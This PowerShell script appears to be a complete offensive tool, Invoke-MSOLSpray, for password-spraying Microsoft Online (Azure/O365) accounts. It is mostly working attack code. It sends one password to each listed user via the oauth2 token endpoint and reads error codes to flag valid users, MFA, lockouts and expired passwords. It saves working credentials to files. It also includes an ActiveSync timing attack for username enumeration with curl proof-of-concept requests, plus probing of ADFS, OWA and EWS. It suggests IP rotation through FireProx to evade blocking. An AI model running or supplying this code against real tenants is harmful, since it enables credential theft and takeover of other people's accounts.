function Invoke-MSOLSpray{

<#
    .SYNOPSIS
        This module will perform password spraying against Microsoft Online accounts (Azure/O365). The script logs if a user cred is valid, if MFA is enabled on the account, if a tenant doesn't exist, if a user doesn't exist, if the account is locked, or if the account is disabled.       
        MSOLSpray Function: Invoke-MSOLSpray
        Author: Beau Bullock (@dafthack) | Alex Souza (@w4fz5uck5)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
        This module will perform password spraying against Microsoft Online accounts (Azure/O365). The script logs if a user cred is valid, if MFA is enabled on the account, if a tenant doesn't exist, if a user doesn't exist, if the account is locked, or if the account is disabled.        
    
    
	.PARAMETER UserList
        
        UserList file filled with usernames one-per-line in the format "user@domain.com"
    
    .PARAMETER Password
        
        A single password that will be used to perform the password spray.
    
    .PARAMETER OutFile
        
        A file to output valid results to.
    
    .PARAMETER Force
        
        Forces the spray to continue and not stop when multiple account lockouts are detected.
    
    .PARAMETER URL
        
        The URL to spray against. Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.
    
    .EXAMPLE
        
        C:\PS> Invoke-MSOLSpray -UserList .\userlist.txt -Password Winter2020
        Description
        -----------
        This command will use the provided userlist and attempt to authenticate to each account with a password of Winter2020.
    
    .EXAMPLE
        
        C:\PS> Invoke-MSOLSpray -UserList .\userlist.txt -Password P@ssword -URL https://api-gateway-endpoint-id.execute-api.us-east-1.amazonaws.com/fireprox -OutFile valid-users.txt
        Description
        -----------
        This command uses the specified FireProx URL to spray from randomized IP addresses and writes the output to a file. See this for FireProx setup: https://github.com/ustayready/fireprox.
#>
  Param(


    [Parameter(Position = 0, Mandatory = $False)]
    [string]
    $OutFile = "",

    [Parameter(Position = 1, Mandatory = $False)]
    [string]
    $UserList = "",

    [Parameter(Position = 2, Mandatory = $False)]
    [string]
    $Password = "",

    # Change the URL if you are using something like FireProx
    [Parameter(Position = 3, Mandatory = $False)]
    [string]
    $URL = "https://login.microsoft.com",

    [Parameter(Position = 4, Mandatory = $False)]
    [switch]
    $Force
  )
    
    $ErrorActionPreference= 'silentlycontinue'
    $Usernames = Get-Content $UserList | sort | get-unique # ignore repeatable names
    $count = $Usernames.count
    $curr_user = 0
    $lockout_count = 0
    $lockoutquestion = 0
    $fullresults = @()
	$current_time = Get-Date -Format "dddd MM/dd/yyyy HH:mm K"

	Write-Host -ForegroundColor "gray" "---------------------------------------------------------------"
    Write-Host -ForegroundColor "gray" "[!] There are [$count] total users to spray."
    Write-Host -ForegroundColor "gray" "[!] Now spraying Microsoft Online."
    Write-Host -ForegroundColor "gray" "[!] Current date and time: [$current_time]"
	Write-Host -ForegroundColor "gray" "---------------------------------------------------------------"

	# Test first for ADFS | Exchange | OWA services
	$test_user = $Usernames | Select-Object -First 1
    $BodyParams = @{'username' = $test_user} | ConvertTo-JSON
    $PostHeaders = @{'Accept' = 'application/json'; 'Content-Type' =  'application/x-www-form-urlencoded'}

	# It also can be dumped here: https://login.microsoftonline.com/common/userrealm/?user=test@microsoft.com&api-version=2.1&checkForMicrosoftAccount=true
    $webrequest = Invoke-RestMethod $URL/common/GetCredentialType -Method Post -Headers $PostHeaders -Body $BodyParams

	if ($webrequest.Credentials -match "FederationRedirectUrl") {

		# Get target domain federation
		$federation = $webrequest.Credentials.FederationRedirectUrl
		Write-Host -ForegroundColor "yellow" "     [!] INFO! GOT [FederationRedirectUrl]. Current domain seems behind follow federation!"
		Write-Host -ForegroundColor "blue" "     [*] $federation"
		Write-Host -ForegroundColor "yellow" "     [!] INFO! [FederationRedirectUrl].  This attack should not work properly.. Changing attack method!"
		Write-Host
        $current_time = Get-Date -Format "dddd MM/dd/yyyy HH:mm K"
		"[ REDIRECTED : $current_time ] = $username : $password : $federation " | Out-File -Encoding ascii -Append "logging_file.txt"
		
		# Check for ADFS service
		if ($federation -match "/adfs/ls") {

			Write-Host -ForegroundColor "yellow" "          [!] INFO! Testing if [IdpInitiatedSignOn] is enabled..."

			$new_url = $federation.Split("/adfs/ls")[0]
			$new_webrequest = Invoke-WebRequest $new_url/adfs/ls/IdpInitiatedSignOn.aspx

			if ($new_webrequest.Rawcontent -match "The resource you are trying to access is not available.") {

				Write-Host -ForegroundColor "red" "              [-] ERR! [/adfs/ls/IdpInitiatedSignOn.aspx] is disabled on $new_url host..."
				Write-Host

			} else {

				Write-Host -ForegroundColor "green" "              [+] SUCCESS! [/adfs/ls/IdpInitiatedSignOn.aspx] is enable on $new_url host..."
				Write-Host
				$current_time = Get-Date -Format "dddd MM/dd/yyyy HH:mm K"
				"[ /adfs/ls/IdpInitiatedSignOn.aspx : $current_time ] = $new_url " | Out-File -Encoding ascii -Append "logging_file.txt"
			}
		}
		# Check for OWA service (NOT TESTED)
		Write-Host -ForegroundColor "yellow" "          [!] INFO! Testing if [owa/auth.owa] is enabled on $new_url host..."
		
		# Setting up fake headers
		$GetHeaders = @{Authorization = 'Basic LW5lCmFkbWluOmFkbWluCg=='}
		$webrequest = Invoke-WebRequest $new_url/owa/auth.owa  -Headers $GetHeaders -ErrorVariable status_code_resp

		If ($status_code_resp -match "401") {
		
			Write-Host -ForegroundColor "green" "              [+] SUCCESS! [/owa/auth.owa] is enable on $new_url host..."
			Write-Host
			$current_time = Get-Date -Format "dddd MM/dd/yyyy HH:mm K"
			"[ /owa/auth.owa : $current_time ] = $new_url " | Out-File -Encoding ascii -Append "logging_file.txt"

			# TODO -> Trying to find some OWA realiable vulnerability to enumerate valid usernames fast as possible.
			

		} else {

				Write-Host -ForegroundColor "red" "              [-] ERR! [/owa/auth.owa] is disabled on $new_url host..."
				Write-Host
		}

		# Check for Exchange service (NOT TESTED) 
		Write-Host -ForegroundColor "yellow" "          [!] INFO! Testing if [/EWS/Exchange.asmx] is enabled on $new_url host..."

		# Setting up fake headers	
		$GetHeaders = @{Authorization = 'Basic LW5lCmFkbWluOmFkbWluCg=='}
		$webrequest = Invoke-WebRequest $new_url/EWS/Exchange.asmx -Headers $GetHeaders -ErrorVariable status_code_resp

		If ($status_code_resp -match "401") {
		
			Write-Host -ForegroundColor "green" "              [+] SUCCESS! [/EWS/Exchange.asmx] is enable on $new_url host..."
			Write-Host
			$current_time = Get-Date -Format "dddd MM/dd/yyyy HH:mm K"
			"[ /EWS/Exchange.asmx : $current_time ] = $new_url " | Out-File -Encoding ascii -Append "logging_file.txt"

			# TODO -> Trying to find some Exchange realiable vulnerability to enumerate valid usernames fast as possible.

		} else {

				Write-Host -ForegroundColor "red" "              [-] ERR! [/EWS/Exchange.asmx] is disabled on $new_url host..."
				Write-Host 
		}

		Write-Host -ForegroundColor "yellow" "[!] INFO! Testing [/Microsoft-Active-Sync] vulnerability for user enumeration..."
		Write-Host
		ForEach ($username in $Usernames) {
			# User counter
			$curr_user += 1

			# Setting up the web request
			$encodedCreds = "$($username):$($password)"
			$encodedCreds = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($encodedCreds))
			$basicAuthValue = "Basic $encodedCreds"
			$GetHeaders = @{Authorization = $basicAuthValue; "Host" = "outlook.office365.com"; "Accept" = "*/*"; "User-Agent" = "curl/7.54.0"; "Connection" =  "close"; "Content-Length" = "0"}

			# Check Attack Request time spent
			$webrequest_time = (Measure-Command -Expression {$webrequest = Invoke-WebRequest https://outlook.office365.com/Microsoft-Server-ActiveSync -Headers $GetHeaders -Method Options -ErrorVariable RespErr}).Seconds
			
			# [UNPATCHED] /Microsoft-Active-Sync Timing User Enumeration Vulnerability
			# Disclosed by: @w4fz5uck5
			#
			# https://raw.githubusercontent.com/w4fz5uck5/Microsoft-Active-Sync-Timming-Attack/master/poc.txt
			#
			# time curl -Lv -v "https://outlook.office365.com/Microsoft-Server-ActiveSync" \
			# -I -X OPTIONS -H "Authorization: Basic $(echo -ne support@microsoft.com:Password@123 | base64 )"
			# 
			# It will ONLY works w/ follow headers content order (i dont know why...)
			#
			# POC REQUEST:
			#
			# OPTIONS /Microsoft-Server-ActiveSync HTTP/1.1
			# Host: outlook.office365.com
			# User-Agent: curl/7.54.0
			# Accept: */*
			# Authorization: Basic b64(<USER:PASS>)
			# Connection: close
			# Content-Length: 0


			# Attack / Research results:
			# 
			# 5-6 seconds -> VALID -> microsoft domain
			# 7-9 seconds -> INVALID -> microsoft domain
			#
			# 5-6 seconds -> VALID -> other domain
			# 9+ seconds  -> INVALID -> other domains  ->  It took more seconds to know if credential are valid or not
			#
			# 20 seconds + 403 Forbidden or 200 OK (Not even tested) -> VALID -> USER +  PASSWORD
			#
			# [ /owa/auth.owa | /EWS/Exchange.asmx ]  should be vulnerable too

			if (($webrequest_time -ge 3) -and ($webrequest_time -le 7)) {
		
				Write-Host -ForegroundColor "blue" "[!] INFO! [RESP TIME: $webrequest_time] [/Microsoft-Active-Sync] $username is valid but password seems incorrect. Writing INFO to ./only-valid-users_w_pass_incorrect.txt"
				$username | Out-File  -Encoding ascii -Append "only-valid-users_w_pass_incorrect.txt"

				$current_time = Get-Date -Format "dddd MM/dd/yyyy HH:mm K"
				"[ VALID_USER_W_INCORRET_PASSWORD : $current_time [RESP TIME: $webrequest_time]] = $username : $password" | Out-File -Encoding ascii -Append "logging_file.txt"
	
			  # If Username + Password valid Microsoft-Active-Sync Timing should return 403 or 200
			} ElseIf(($RespErr -match "200") -or ($RespErr -match "403")) {

				Write-Host -ForegroundColor "green" "[+] SUCCESS! [RESP TIME: $webrequest_time] VALID ACCOUNT | $username : $password"

				$current_time = Get-Date -Format "dddd MM/dd/yyyy HH:mm K"
				"[ VALID : $current_time ] = $username : $password" | Out-File -Encoding ascii -Append "logging_file.txt"
				
				$fullresults = "$username : $password"
				$fullresults | Out-File -Encoding ascii -Append $OutFile

			} else {
				Write-Host -ForegroundColor "red" "[-] ERR! [RESP TIME: $webrequest_time] Invalid username : $username..."
				$current_time = Get-Date -Format "dddd MM/dd/yyyy HH:mm K"
				"[ INVALID : $current_time ] = $username : $password" | Out-File -Encoding ascii -Append "logging_file.txt"
				continue
			}
		}
		exit
	}

	# Start oauth2/token user enumeration
	ForEach ($username in $Usernames) {
		
		# User counter
		$curr_user += 1
		Write-Host -nonewline "$curr_user of $count users tested`r"

		# Setting up the web request
		$webrequest = ""
		$BodyParams = @{'resource' = 'https://graph.windows.net'; 'client_id' = '1b730954-1685-4b74-9bfd-dac224a7b894' ; 'client_info' = '1' ; 'grant_type' = 'password' ; 'username' = $username ; 'password' = $password ; 'scope' = 'openid'}
		$PostHeaders = @{'Accept' = 'application/json'; 'Content-Type' =  'application/x-www-form-urlencoded'}
		$webrequest =  Invoke-WebRequest $URL/common/oauth2/token -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr 

		# If we get a 200 response code it's a valid cred
		If ($webrequest.StatusCode -eq "200") {

			Write-Host -ForegroundColor "green" "[+] SUCCESS! $username : $password"
		 
			$current_time = Get-Date -Format "dddd MM/dd/yyyy HH:mm K"
			"[ VALID : $current_time ] = $username : $password" | Out-File -Encoding ascii -Append "logging_file.txt"
			
		    $fullresults = "$username : $password"
			$fullresults | Out-File -Encoding ascii -Append $OutFile

		} else {
		        # Check the response for indication of MFA, tenant, valid user, etc...
		        # Here is a referense list of all the Azure AD Authentication an Authorization Error Codes:
		        # https://docs.microsoft.com/en-us/azure/active-directory/develop/reference-aadsts-error-codes

		        # Standard invalid password
		    If($RespErr -match "AADSTS50126")
		        {
		        Write-Host -ForegroundColor "yellow" "[!] INFO! $username is valid but password seems incorrect. Writing INFO to ./only-valid-users_w_pass_incorrect.txt"
				$username | Out-File  -Encoding ascii -Append "only-valid-users_w_pass_incorrect.txt"

				$current_time = Get-Date -Format "dddd MM/dd/yyyy HH:mm K"
				"[ VALID_USER_W_INCORRET_PASSWORD : $current_time : AADSTS50126 ] = $username : $password" | Out-File -Encoding ascii -Append "logging_file.txt"
				continue
		        }

		        # Invalid Tenant Response
		    ElseIf(($RespErr -match "AADSTS50128") -or ($RespErr -match "AADSTS50059"))
		        {
		        Write-Host -ForegroundColor "gray" "[*] WARNING! Tenant for account $username doesn't exist. Check the domain to make sure they are using Azure/O365 services."
				$current_time = Get-Date -Format "dddd MM/dd/yyyy HH:mm K"
				"[ INEXISTENT_ON_DOMAIN : $current_time : AADSTS50128 ] = $username : $password" | Out-File -Encoding ascii -Append "logging_file.txt"
		        }

		        # Invalid Username
		    ElseIf($RespErr -match "AADSTS50034")
		        {
		        Write-Host -ForegroundColor "gray" "[*] WARNING! The user $username doesn't exist."

				$current_time = Get-Date -Format "dddd MM/dd/yyyy HH:mm K"
				"[ INEXISTENT : $current_time ] = $username : $password : AADSTS50034" | Out-File -Encoding ascii -Append "logging_file.txt"
		        }

		        # Microsoft MFA response
		    ElseIf(($RespErr -match "AADSTS50079") -or ($RespErr -match "AADSTS50076"))
		        {
		        Write-Host -ForegroundColor "green" "[*] SUCCESS! $username : $password - NOTE: The response indicates MFA (Microsoft) is in use."		
		        
				$current_time = Get-Date -Format "dddd MM/dd/yyyy HH:mm K"
				"[ VALID_AND_IN_USE : $current_time ] = $username : $password : AADSTS50079|AADSTS50076" | Out-File -Encoding ascii -Append "logging_file.txt"
				
		        $fullresults = "$username : $password"
				$fullresults | Out-File -Encoding ascii -Append $OutFile
				
		        }

		        # Conditional Access response (Based off of limited testing this seems to be the repsonse to DUO MFA)
		    ElseIf($RespErr -match "AADSTS50158")
		        {
		        Write-Host -ForegroundColor "green" "[*] SUCCESS! $username : $password - NOTE: The response indicates conditional access (MFA: DUO or other) is in use."
		        $current_time = Get-Date -Format "dddd MM/dd/yyyy HH:mm K"
				"[ VALID_AND_IN_USE : $current_time ] = $username : $password : AADSTS50158" | Out-File -Encoding ascii -Append "logging_file.txt"
				
		        $fullresults = "$username : $password"
				$fullresults | Out-File -Encoding ascii -Append $OutFile
				
		        }

		        # Locked out account or Smart Lockout in place
		    ElseIf($RespErr -match "AADSTS50053")
		        {
		        Write-Host -ForegroundColor "gray" "[*] WARNING! The account $username appears to be locked."
		        $lockout_count++

				$current_time = Get-Date -Format "dddd MM/dd/yyyy HH:mm K"
				"[ LOCKED : $current_time ] = $username : $password : AADSTS50053" | Out-File -Encoding ascii -Append "logging_file.txt"
				
		        }

		        # Disabled account
		    ElseIf($RespErr -match "AADSTS50057")
		        {
		        Write-Host -ForegroundColor "gray" "[*] WARNING! The account $username appears to be disabled."

				$current_time = Get-Date -Format "dddd MM/dd/yyyy HH:mm K"
				"[ DISABLED : $current_time ] = $username : $password : AADSTS50057" | Out-File -Encoding ascii -Append "logging_file.txt"
		        }
		    
		        # User password is expired
		    ElseIf($RespErr -match "AADSTS50055")
		        {
		        Write-Host -ForegroundColor "green" "[*] SUCCESS! $username : $password - NOTE: The user's password is expired."

		        $current_time = Get-Date -Format "dddd MM/dd/yyyy HH:mm K"
				"[ PASSWORD_EXPIRED : $current_time ] = $username : $password : AADSTS50055" | Out-File -Encoding ascii -Append "logging_file.txt"
				
		        $fullresults = "$username : $password"
				$fullresults | Out-File -Encoding ascii -Append $OutFile
		        }

		        # Unknown errors
		    Else
		        {
		        Write-Host -ForegroundColor "red" "[-] Got an error we haven't seen yet for user $username"
		        $RespErr
		        }
		}

		# If the force flag isn't set and lockout count is 10 we'll ask if the user is sure they want to keep spraying
		if (!$Force -and $lockout_count -eq 10 -and $lockoutquestion -eq 0)
		{
		    $title = "WARNING! Multiple Account Lockouts Detected!"
		    $message = "10 of the accounts you sprayed appear to be locked out. Do you want to continue this spray?"

		    $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
		        "Continues the password spray."

		    $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
		        "Cancels the password spray."

		    $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)

		    $result = $host.ui.PromptForChoice($title, $message, $options, 0)
		    $lockoutquestion++
		    if ($result -ne 0)
		    {
		        Write-Host "[*] Cancelling the password spray."
		        Write-Host "NOTE: If you are seeing multiple 'account is locked' messages after your first 10 attempts or so this may indicate Azure AD Smart Lockout is enabled."
		        break
		    }
		}
	}

	Write-Host -ForegroundColor "blue" "[ DEBUG ] Results have been written to logging_file.txt and only-valid-users.txt"
}
